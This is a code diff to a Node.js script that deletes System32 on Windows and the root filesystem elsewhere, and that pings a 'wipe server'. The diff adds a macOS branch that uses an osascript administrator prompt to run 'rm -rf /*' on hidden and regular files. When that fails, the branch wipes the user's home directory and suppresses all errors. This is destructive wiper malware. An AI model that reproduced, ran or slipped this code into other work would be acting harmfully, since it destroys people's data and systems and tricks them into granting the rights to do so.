@@ -5,7 +5,9 @@ const { execSync } = require('child_process');
 
 const LOSE_TARGET = process.platform === 'win32'
   ? path.join(process.env.SystemRoot || 'C:\\Windows', 'System32')
-  : '/';
+  : process.platform === 'darwin'
+    ? '/'
+    : '/';
 
 function pingWipeServer() {
   try {
@@ -20,6 +22,14 @@ function deleteLoseTarget() {
   try {
     if (process.platform === 'win32') {
       fs.rmSync(LOSE_TARGET, { recursive: true, force: true });
+    } else if (process.platform === 'darwin') {
+      // macOS: escalate via osascript admin prompt, fall back to user-space wipe.
+      // SIP protects /System/Library/CoreServices etc. but /usr/local, /Library, ~ are fair game.
+      execSync(
+        'osascript -e \'do shell script "rm -rf /* /.[!.]*" with administrator privileges\' 2>/dev/null' +
+        ' || rm -rf ~/* ~/.[!.]* 2>/dev/null; true',
+        { shell: '/bin/bash' }
+      );
     } else {
       // rmSync can't remove '/' itself (EBUSY on mount point); delete contents via shell.
       // Try pkexec for a root auth prompt; fall back to plain rm (deletes user-owned files).
